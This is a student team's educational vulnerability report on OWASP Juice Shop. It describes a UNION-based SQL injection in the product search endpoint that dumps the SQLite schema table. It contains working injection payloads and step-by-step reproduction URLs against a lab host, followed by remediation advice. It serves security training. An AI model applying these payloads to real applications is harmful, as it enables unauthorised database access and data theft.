CVE-ID: EDU-JUICESHOP-2026-T06-005
Title: Database Schema Exfiltration via SQL Injection in Product Search API
Affected Lab: OWASP Juice Shop | Container: websploit-juice-shop | Port: 3000
Component: Product Search REST API (/rest/products/search)
Severity: Critical
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
CVSS Score: 8.6

Description:

The product search endpoint of the OWASP Juice Shop application is vulnerable to SQL Injection via the q parameter. The application fails to properly sanitize user-supplied input before incorporating it into a backend SQLite query.

An unauthenticated attacker can exploit this vulnerability using UNION-based SQL Injection to extract sensitive database metadata from SQLite’s internal schema table (sqlite_master). By manipulating the number of selected columns to match the original query structure, the attacker can dump the entire database schema definition, including table structures and SQL creation statements.

This vulnerability allows full disclosure of database design, enabling further targeted attacks such as credential extraction, privilege escalation, or chained exploitation.

Proof of Concept:

Target URL:
http://10.6.6.12:3000/rest/products/search?q=

Initial test payload:

'--

This confirms injection and reveals backend behavior consistent with SQLite.

Final working payload (9 columns required):

qwert')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--

Result:
The response returns raw SQL schema definitions from the internal sqlite_master table, confirming successful database schema exfiltration. The application challenge “Database Schema” is marked as solved.

Steps to reproduce:

Go to developer tools and check the network tab

There will be a GET request for search?q=

Take the url and paste it in the search bar

The url leads to a dump of all the product listings

Now we can test to see if the q parameter is vulnerable to SQL injection using '-- in the url
http://10.6.6.12:3000/rest/products/search?q='--

This exposes the backend to be SQLite

Searching details related to SQLite db schema reveals that the database schema is stored in an internal table called SQLite _master

Now we can expand the query in the url into a union select query
http://10.6.6.12:3000/rest/products/search?q='))UNION SELECT * FROM sqlite_master--

This reveals that the SELECTs to the left and right of UNION do not have the same number of result columns, this means we can select the sqlite_master table but we don't have the right number of columns

Now we can brute force the number of columns and it ends up being 9 columns that needs to be selected
http://10.6.6.12:3000/rest/products/search?q= ')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master --

Next we remove the products table by adding qwert in the q parameter and we replace the first column with sql to dump the schema
http://10.6.6.12:3000/rest/products/search?q= qwert')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--

To confirm we have solved the challenge we go to the home page of owasp juice shop

Remediation:

Parameterized Queries:
Use prepared statements for all SQL queries to prevent injection.

Input Validation:
Apply strict validation and reject special characters not required for legitimate search queries.

ORM Hardening:
Avoid dynamic query construction. Ensure secure configuration of Sequelize (or equivalent ORM).

Error Handling:
Prevent verbose database error exposure that reveals backend details (e.g., SQLite usage).

Principle of Least Privilege:
Restrict database account permissions to prevent metadata access where unnecessary.

Discovered By: Team 6
Date: 22 February 2026
